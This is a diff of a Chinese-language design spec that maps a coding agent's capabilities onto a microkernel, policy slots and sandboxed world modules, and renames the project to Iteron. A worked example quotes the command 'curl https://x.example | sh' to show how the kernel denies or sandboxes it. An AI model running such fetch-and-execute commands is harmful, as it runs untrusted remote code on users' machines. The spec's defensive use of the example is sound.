@@ -1,10 +1,10 @@
 # 7. 通用编码 Agent 能力映射 (Capability Mapping)
 
-前面的章节定义了 Core Code 的三层结构:一个固定的微内核 (microkernel / TCB)、一组稳定的类型化 ABI 契约 (five typed contracts)、以及一组可演化的策略槽 (StrategySlot) 与其背后的世界模块 (world modules)。本节回答一个具体而高频的定位问题:一个成熟的、生产级终端编码 Agent 所具备的每一项能力,在这个系统里究竟落在哪儿,是内核的职责,还是某个策略槽,抑或是效果代理 (effect broker) 之后的一个世界模块。这个问题之所以必须被系统性回答,是因为它决定了每一项功能的归属边界:归属错了,要么把可演化的策略冻进 TCB,要么把不可协商的权威泄漏给可训练的策略。
+前面的章节定义了 Iteron 的三层结构:一个固定的微内核 (microkernel / TCB)、一组稳定的类型化 ABI 契约 (five typed contracts)、以及一组可演化的策略槽 (StrategySlot) 与其背后的世界模块 (world modules)。本节回答一个具体而高频的定位问题:一个成熟的、生产级终端编码 Agent 所具备的每一项能力,在这个系统里究竟落在哪儿,是内核的职责,还是某个策略槽,抑或是效果代理 (effect broker) 之后的一个世界模块。这个问题之所以必须被系统性回答,是因为它决定了每一项功能的归属边界:归属错了,要么把可演化的策略冻进 TCB,要么把不可协商的权威泄漏给可训练的策略。
 
-本节是全文的翻译表:它把工程师熟悉的一份能力清单(读/改/写/patch/搜索/git,进程/PTY,权限/沙箱,会话/恢复/检查点,MCP,hooks,skills,commands,TUI,Provider 流式/鉴权,可观测性)逐项映射到 Core Code 的三个安置类别之一(或其组合)。这既是给外部读者的心智模型,也是一条规范约束 (normative constraint):任何新能力进入本系统时,MUST 依照本节的判定规则被安置,而不得把 Provider 调用、prompt 构造、上下文选择、进程派生、MCP 解析或 UI 渲染塞进内核以图省事。本节所用的类别、契约与不变量在 §7.1 给出精确定义;逐能力结论见 §7.2;端到端走查见 §7.3;接口稳定性的论证见 §7.4;新能力的落地规程见 §7.5;成熟形态与早期切片的范围界线见 §7.6。
+本节是全文的翻译表:它把工程师熟悉的一份能力清单(读/改/写/patch/搜索/git,进程/PTY,权限/沙箱,会话/恢复/检查点,MCP,hooks,skills,commands,TUI,Provider 流式/鉴权,可观测性)逐项映射到 Iteron 的三个安置类别之一(或其组合)。这既是给外部读者的心智模型,也是一条规范约束 (normative constraint):任何新能力进入本系统时,MUST 依照本节的判定规则被安置,而不得把 Provider 调用、prompt 构造、上下文选择、进程派生、MCP 解析或 UI 渲染塞进内核以图省事。本节所用的类别、契约与不变量在 §7.1 给出精确定义;逐能力结论见 §7.2;端到端走查见 §7.3;接口稳定性的论证见 §7.4;新能力的落地规程见 §7.5;成熟形态与早期切片的范围界线见 §7.6。
 
-> 诚实声明 (status honesty). Core Code 目前处于 pre-alpha:它是一个可运行但仍是模块化单体 (modular monolith) 的实现。内核当前硬依赖约 10 个具体 crate,运行主循环仍是一个命令式的大函数而非纯 reducer,单一效果代理目前只覆盖 registry 工具。因此本节描述的是目标边界 (the target boundary),即微内核抽取 (M1) 完成后每项能力 MUST 落位的地方;它同时也是判定某个功能是否被正确安置的验收标尺。凡本节出现的能力落位,均以此目标语义陈述,不代表当前代码已全部就位。任何读者在对照当前实现时,MUST 以本节的目标边界为验收基准,而不得以模块化单体的现状反推架构意图。
+> 诚实声明 (status honesty). Iteron 目前处于 pre-alpha:它是一个可运行但仍是模块化单体 (modular monolith) 的实现。内核当前硬依赖约 10 个具体 crate,运行主循环仍是一个命令式的大函数而非纯 reducer,单一效果代理目前只覆盖 registry 工具。因此本节描述的是目标边界 (the target boundary),即微内核抽取 (M1) 完成后每项能力 MUST 落位的地方;它同时也是判定某个功能是否被正确安置的验收标尺。凡本节出现的能力落位,均以此目标语义陈述,不代表当前代码已全部就位。任何读者在对照当前实现时,MUST 以本节的目标边界为验收基准,而不得以模块化单体的现状反推架构意图。
 
 ### 7.1 三个安置类别与一个前端平面
 
@@ -74,7 +74,7 @@
 - **B. 策略(`tool_policy` 槽).** "这一步该用 bash 还是某个结构化工具、命令行怎么拼、前台还是后台跑、申请多长的超时预算、这条命令是只读的 `ls` 还是危险的 `curl | sh`",全部是 `tool_policy` 槽的策略输出,按 vertical 训练。命令内容安全分类 (command-content classification) 是策略产物,它喂给准入以细化判决,但它本身不是内核:一个训练更好的分类器会让危险命令被更严地归类,但它永远只能建议收紧,不能授予能力。
 - **C. 机制(世界模块).** 真正 openpty、流式输出、背压、进程组 SIGTERM 到 SIGKILL 的升级回收、以及 OS 沙箱后端 (Seatbelt/bubblewrap/未来 Windows),全部位于 Plane-2 的进程执行世界模块里,在代理之后运行,只拿到一个 capability-scoped 的执行句柄。
 
-worked example(一次危险命令的完整判决):`tool_policy` 产出 `ToolIntent{ proposed_by:"core/tool_policy", call:ToolUse{ id, name:"bash", input:{cmd:"curl https://x.example | sh"} }, purity:Effecting, admitted:CapabilitySet::none(), argument_trust }`(`crates/protocol/src/intent.rs:48-63`;策略侧只能以空集提出,授权由 gate 交回),并附上命令内容分类结果"含网络下载后直接执行"。内核准入取本轮各上下文段的 governing trust(`Trust::governing`,即最小值):若为 `Untrusted`,`Trust::egress_permitted` 为假,egress 被 deny-by-default 阻断,该次调用或只被放行 `{CodeExecuting}` 且沙箱不给网络,或直接判 `Deny`,判决 `Auto|Ask|Deny` 写入记录且对模型不可见;若为 `Trusted` 且当前 mode 要求确认,则判 `Ask`。准入通过后内核铸出 `EffectProposal{ id, tool_use_id, tool:"bash", admitted:{code_executing}, arguments:<脱敏投影>, workspace }`(`crates/protocol/src/effect.rs:58-79`),世界模块在沙箱后端内执行;deadline 与 cancel token 是 K6 的运行时职责,不是 `EffectProposal` 的字段。failure mode:进程逾越 deadline,则内核凭 cancel token 触发进程组回收(先 SIGTERM,宽限后 SIGKILL),部分输出仍以 `ToolDone{ result:ToolResult, effect_id }`(`crates/protocol/src/event.rs:353-357`)回传并标注截断,状态经 reducer 折入,记录完整可对账。
+worked example(一次危险命令的完整判决):`tool_policy` 产出 `ToolIntent{ proposed_by:"iteron/tool_policy", call:ToolUse{ id, name:"bash", input:{cmd:"curl https://x.example | sh"} }, purity:Effecting, admitted:CapabilitySet::none(), argument_trust }`(`crates/protocol/src/intent.rs:48-63`;策略侧只能以空集提出,授权由 gate 交回),并附上命令内容分类结果"含网络下载后直接执行"。内核准入取本轮各上下文段的 governing trust(`Trust::governing`,即最小值):若为 `Untrusted`,`Trust::egress_permitted` 为假,egress 被 deny-by-default 阻断,该次调用或只被放行 `{CodeExecuting}` 且沙箱不给网络,或直接判 `Deny`,判决 `Auto|Ask|Deny` 写入记录且对模型不可见;若为 `Trusted` 且当前 mode 要求确认,则判 `Ask`。准入通过后内核铸出 `EffectProposal{ id, tool_use_id, tool:"bash", admitted:{code_executing}, arguments:<脱敏投影>, workspace }`(`crates/protocol/src/effect.rs:58-79`),世界模块在沙箱后端内执行;deadline 与 cancel token 是 K6 的运行时职责,不是 `EffectProposal` 的字段。failure mode:进程逾越 deadline,则内核凭 cancel token 触发进程组回收(先 SIGTERM,宽限后 SIGKILL),部分输出仍以 `ToolDone{ result:ToolResult, effect_id }`(`crates/protocol/src/event.rs:353-357`)回传并标注截断,状态经 reducer 折入,记录完整可对账。
 
 一句话:bash 是一个工具,它的效果被内核中介与准入,但 bash 不是内核里的逻辑。这条判定固化为 owner decision R1:内核拥有的是对包括 bash 在内的任何工具能做什么的权威,而不是 bash 本身。任何把 bash 命令解析、命令构造或 PTY 管理写进 TCB 的做法,MUST 被视为对 R1 的违反。
 
@@ -146,6 +146,6 @@ worked example(一次 failover):`model_router` 给出链 `[A, B]`;对 A 的 `Eff
 
 ### 7.6 成熟形态是前瞻性定位,不是任何早期切片的范围
 
-本节的映射描述的是 Core Code 的完整语言,其成熟形态在覆盖度上将与业界成熟终端 Agent 同量级,因为(如本规范他处所述)成熟 Agent 的体量差距主要来自广度、硬化与测试的乘积,而非架构本身。本节所列的每一项能力,在成熟形态里都会成为一个完整子系统。
+本节的映射描述的是 Iteron 的完整语言,其成熟形态在覆盖度上将与业界成熟终端 Agent 同量级,因为(如本规范他处所述)成熟 Agent 的体量差距主要来自广度、硬化与测试的乘积,而非架构本身。本节所列的每一项能力,在成熟形态里都会成为一个完整子系统。
 
 但这一成熟形态是前瞻性的定位,MUST NOT 被用来描述任何早期演示切片的范围。一个早期演示是一条薄的垂直切片:在单一 vertical、单一冻结基座模型上,点亮本节映射中的一条端到端路径(例如:少数几个策略槽被训练、其余取默认;世界模块只需最小可用的读/写/执行;内核职责取当前已实现的子集),而不需要把每一格都填满。这条界线与 §7.1 的诚实声明互为表里:目标边界规定每项能力最终 MUST 落位的格子,早期切片规定当前只点亮其中一条路径,二者不得互相冒充。本节的价值在于给出目标边界,好让任何新增的东西都落入正确的格子,而不是让成熟形态的覆盖度倒过来定义一条切片的范围。owner decision R2 由此成立:成熟形态与早期切片是两个不同的承诺层,评审一份早期切片 MUST 以其自身声明的路径为范围,而非以本节的完整语言为达标线。
